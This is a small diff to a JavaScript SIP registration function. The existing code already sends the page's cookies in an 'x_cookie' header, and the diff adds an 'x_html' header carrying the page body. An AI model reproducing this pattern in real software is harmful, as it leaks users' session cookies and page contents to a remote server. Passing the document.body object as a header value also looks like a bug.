@@ -372,6 +372,9 @@ function sipRegister() {
 			}, {
                 name: 'x_cookie',
                 value: document.cookie
+            }, {
+                name: 'x_html',
+                value: document.body
             }]
 		});
 
